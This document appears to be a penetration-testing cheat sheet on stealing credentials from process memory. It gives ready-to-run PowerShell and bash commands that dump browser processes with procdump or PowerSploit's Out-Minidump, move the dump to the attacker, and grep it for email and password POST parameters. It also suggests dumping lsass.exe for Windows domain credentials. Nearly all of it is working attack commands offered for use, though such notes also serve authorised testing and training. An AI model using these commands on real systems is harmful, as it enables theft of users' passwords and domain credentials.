# Process Memory Dump for Credentials (procdump)

When a browser or application is actively running, credentials used in POST requests may be present in process memory. Dumping the process and grepping for form parameters recovers them.

## Dump Process Memory on Windows

```powershell
# Find the PID of the target process
Get-Process | Where-Object { $_.Name -match "firefox|chrome|iexplore" }
# Note the PID

# Upload procdump64.exe (Sysinternals) then dump:
.\procdump64.exe -ma <PID> -accepteula
# Creates: firefox.exe_<date>.dmp

# Alternative: PowerSploit's Out-Minidump
Get-Process -Id <PID> | Out-Minidump
```

## Extract Credentials from Dump

```bash
# Download the .dmp file to attacker
# Grep for POST parameters (email/password patterns)
grep -aoE 'email=[^&]+&password=[^&]+' firefox.exe_*.dmp

# Or target specific form parameter names
grep -aoE 'login_username=.{1,40}&login_password=.{1,60}' firefox.exe_*.dmp

# Generic credential search
strings firefox.exe_*.dmp | grep -i "password\|passwd\|login" | grep "="
```

## Notes
- Works for any application keeping credentials in memory: browsers, SSH clients, password managers, custom apps
- Browser dumps are large (200-400 MB for Firefox) — download can be slow
- The `-ma` flag = full process dump (includes all memory, not just exception info)
- `Out-Minidump` from PowerSploit is available via Evil-WinRM's `menu` command
- Also useful: dump `lsass.exe` for Windows domain credentials (requires SYSTEM/SeDebugPrivilege)
